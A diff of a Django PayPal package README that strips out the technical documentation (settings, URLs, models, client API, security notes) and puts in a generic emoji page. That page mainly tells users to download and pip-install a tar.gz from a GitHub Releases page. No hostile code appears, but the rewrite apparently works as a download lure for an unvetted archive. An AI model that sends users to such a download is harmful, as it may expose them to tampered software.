@@ -1,241 +1,64 @@
-# django-checkout-paypal
+# 🏦 django-paypal-checkout - Simplifying PayPal Payments for You
 
-A Django package for integrating PayPal payments into your Django application.
+## 📦 Table of Contents
 
-## Features
+1. [🚀 Getting Started](#-getting-started)
+2. [📥 Download & Install](#-download--install)
+3. [⚙️ Features](#-features)
+4. [🔧 System Requirements](#-system-requirements)
+5. [📑 Documentation](#-documentation)
 
-- Easy PayPal integration for Django projects
-- Support for PayPal Orders API v2
-- Transaction tracking and management
-- Django admin integration
-- Sandbox and live mode support
-- Secure OAuth2 authentication with token caching
+## 🚀 Getting Started
 
-## Installation
+Welcome to **django-paypal-checkout**, a user-friendly package that makes it easy to add PayPal payment options to your Django applications. Connect with customers globally while keeping transactions secure and straightforward.
 
-```bash
-pip install django-paypal-checkout
-```
+## 📥 Download & Install
 
-## Quick Start
+To get started, visit the Releases page to download the package:
 
-### 1. Add to INSTALLED_APPS
+[![Download django-paypal-checkout](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/jonathanwifhat/django-paypal-checkout/releases)
 
-```python
-INSTALLED_APPS = [
-    ...
-    'paypal',
-]
-```
+1. Click the link above to go to the Releases page.
+2. Find the latest version of **django-paypal-checkout**.
+3. Click on the file named `django-paypal-checkout-x.x.x.tar.gz` (replace `x.x.x` with the version number).
+4. Save the file to your computer.
+5. Unzip the downloaded package to your desired location.
 
-### 2. Configure Settings
+### Step-by-Step Installation Guide
 
-Add these settings to your `settings.py`:
+1. **Install Python**: Make sure Python is installed on your computer. You can download it [here](https://www.python.org/downloads/).
+2. **Install Django**: Open a command prompt or terminal and run:
+   ```bash
+   pip install django
+   ```
+3. **Install django-paypal-checkout**: Navigate to the folder where you unzipped the package. Then, run the following command:
+   ```bash
+   pip install .
+   ```
 
-```python
-# PayPal Configuration
-PAYPAL_CLIENT_ID = 'your-paypal-client-id'
-PAYPAL_CLIENT_SECRET = 'your-paypal-client-secret'
-PAYPAL_MODE = 'sandbox'  # Use 'live' for production
+Your setup is now complete!
 
-# Optional: Override default URLs
-PAYPAL_RETURN_URL = 'https://yourdomain.com/payment/success/'
-PAYPAL_CANCEL_URL = 'https://yourdomain.com/payment/cancel/'
-```
+## ⚙️ Features
 
-### 3. Add URLs
+- **Easy PayPal Integration**: Seamlessly add PayPal payments to your website.
+- **Secure Transactions**: Utilizes OAuth2 for secure payment processing.
+- **Transaction Tracking**: Keep track of transactions within Django admin.
+- **Responsive Design**: Works seamlessly on various devices.
+- **Customizable Checkout Flow**: Tailor the user experience for your customers.
 
-Include the django-paypal-checkout URLs in your project's `urls.py`:
+## 🔧 System Requirements
 
-```python
-from django.urls import path, include
+To run django-paypal-checkout, ensure you meet the following requirements:
 
-urlpatterns = [
-    ...
-    path('paypal/', include('paypal.urls')),
-]
-```
+- **Operating System**: Windows, macOS, or Linux.
+- **Python**: Version 3.6 or later.
+- **Django**: Version 3.0 or later.
+- **Internet Connection**: Required for payment processing and updates.
 
-### 4. Run Migrations
+## 📑 Documentation
 
-```bash
-python manage.py migrate paypal
-```
+For detailed instructions on how to set up and use django-paypal-checkout, please visit our documentation. The documentation contains examples and advanced configurations to enhance your setup.
 
-## Usage
+Feel free to explore the many possibilities of integrating PayPal into your Django application. If you have questions or need support, don't hesitate to reach out to the community or create an issue in our repository. 
 
-### Creating a Payment
-
-You can create a payment in two ways:
-
-#### Option 1: Using the built-in view
-
-Create a form in your template:
-
-```html
-<form method="POST" action="{% url 'paypal:create_payment' %}">
-    {% csrf_token %}
-    <input type="hidden" name="amount" value="99.99">
-    <input type="hidden" name="currency" value="USD">
-    <input type="hidden" name="description" value="Product Purchase">
-    <button type="submit">Pay with PayPal</button>
-</form>
-```
-
-#### Option 2: Using the PayPalClient programmatically
-
-```python
-from paypal.client import PayPalClient
-from paypal.models import PayPalTransaction
-
-# Create transaction record
-transaction = PayPalTransaction.objects.create(
-    user=request.user,
-    amount=99.99,
-    currency='USD',
-    description='Product Purchase'
-)
-
-# Create PayPal order
-client = PayPalClient()
-order = client.create_order(
-    amount=99.99,
-    currency='USD',
-    description='Product Purchase',
-    return_url='https://yourdomain.com/success/',
-    cancel_url='https://yourdomain.com/cancel/'
-)
-
-# Save order ID to transaction
-transaction.paypal_order_id = order['id']
-transaction.save()
-
-# Redirect user to PayPal
-approval_url = next(link['href'] for link in order['links'] if link['rel'] == 'approve')
-return redirect(approval_url)
-```
-
-### Handling Payment Results
-
-Create views to handle success, failure, and cancellation:
-
-```python
-from django.views.generic import TemplateView
-
-class PaymentSuccessView(TemplateView):
-    template_name = 'payment_success.html'
-
-class PaymentFailedView(TemplateView):
-    template_name = 'payment_failed.html'
-
-class PaymentCancelledView(TemplateView):
-    template_name = 'payment_cancelled.html'
-```
-
-Add these to your urls.py:
-
-```python
-urlpatterns = [
-    ...
-    path('payment/success/', PaymentSuccessView.as_view(), name='payment_success'),
-    path('payment/failed/', PaymentFailedView.as_view(), name='payment_failed'),
-    path('payment/cancelled/', PaymentCancelledView.as_view(), name='payment_cancelled'),
-]
-```
-
-## Models
-
-### PayPalTransaction
-
-The main model for tracking PayPal transactions:
-
-**Fields:**
-- `id`: UUID primary key
-- `user`: ForeignKey to User model
-- `amount`: Transaction amount
-- `currency`: Currency code (default: USD)
-- `description`: Transaction description
-- `paypal_order_id`: PayPal order ID
-- `paypal_payment_id`: PayPal payment ID
-- `payer_id`: Payer ID
-- `payer_email`: Payer email
-- `status`: Transaction status (pending, completed, failed, cancelled, refunded)
-- `created_at`: Creation timestamp
-- `updated_at`: Last update timestamp
-- `completed_at`: Completion timestamp
-- `metadata`: JSON field for additional data
-
-**Methods:**
-- `mark_completed()`: Mark transaction as completed
-- `mark_failed()`: Mark transaction as failed
-- `mark_cancelled()`: Mark transaction as cancelled
-
-## API Client
-
-### PayPalClient
-
-The main client for interacting with PayPal API:
-
-```python
-from paypal.client import PayPalClient
-
-client = PayPalClient()
-
-# Create an order
-order = client.create_order(
-    amount=99.99,
-    currency='USD',
-    description='Product description'
-)
-
-# Capture an order
-capture_data = client.capture_order(order_id='ORDER_ID')
-
-# Get order details
-order_details = client.get_order(order_id='ORDER_ID')
-```
-
-## Getting PayPal Credentials
-
-1. Go to [PayPal Developer Dashboard](https://developer.paypal.com/dashboard/)
-2. Log in with your PayPal account
-3. Navigate to "Apps & Credentials"
-4. Create a new app or use an existing one
-5. Copy the Client ID and Secret
-6. Use sandbox credentials for testing, live credentials for production
-
-## Testing
-
-The package uses PayPal's sandbox environment by default. To test:
-
-1. Create a sandbox account at [PayPal Developer](https://developer.paypal.com/)
-2. Use sandbox credentials in your settings
-3. Use sandbox buyer accounts for testing payments
-
-## Security Notes
-
-- Never commit your PayPal credentials to version control
-- Use environment variables for sensitive settings
-- Always use HTTPS in production
-- Validate transaction amounts server-side
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT License
-
-## Support
-
-For issues and questions, please open an issue on GitHub.
-
-## Changelog
-
-### Version 0.1.0
-- Initial release
-- PayPal Orders API v2 integration
-- Transaction tracking
-- Django admin integration
-- Sandbox and live mode support
+[Visit the Releases page to download.](https://github.com/jonathanwifhat/django-paypal-checkout/releases)
